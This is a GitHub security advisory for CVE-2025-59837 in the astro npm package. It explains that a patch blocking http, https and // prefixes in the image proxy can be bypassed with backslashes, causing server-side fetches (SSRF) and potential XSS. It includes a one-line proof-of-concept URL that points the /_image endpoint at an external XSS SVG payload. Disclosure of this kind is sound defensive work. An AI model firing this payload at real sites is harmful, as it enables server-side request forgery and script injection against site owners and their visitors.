# [H] Astro's bypass of image proxy domain validation leads to SSRF and potential XSS

## Summary
Severity: High
Advisory: GHSA-qcpr-679q-rhm2
CVE: CVE-2025-59837
CWE: CWE-79, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2025-10-28
Source: https://github.com/advisories/GHSA-qcpr-679q-rhm2
Type: github-advisory

## Affected
- npm: `astro` — affected >=5.13.4 <5.13.10

## Details
### Summary

This is a patch bypass of CVE-2025-58179 in commit [9ecf359](https://github.com/withastro/astro/commit/9ecf3598e2b29dd74614328fde3047ea90e67252). The fix blocks `http://`, `https://` and `//`, but can be bypassed using backslashes (`\`) - the endpoint still issues a server-side fetch.

### PoC
[https://astro.build/_image?href=\\raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg&f=svg](https://astro.build/_image?href=%5C%5Craw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg&f=svg)

## References
- https://github.com/withastro/astro/security/advisories/GHSA-qcpr-679q-rhm2
- https://nvd.nist.gov/vuln/detail/CVE-2025-59837
- https://github.com/withastro/astro/commit/1e2499e8ea83ebfa233a18a7499e1ccf169e56f4
- https://github.com/withastro/astro/commit/9ecf3598e2b29dd74614328fde3047ea90e67252
- https://github.com/withastro/astro
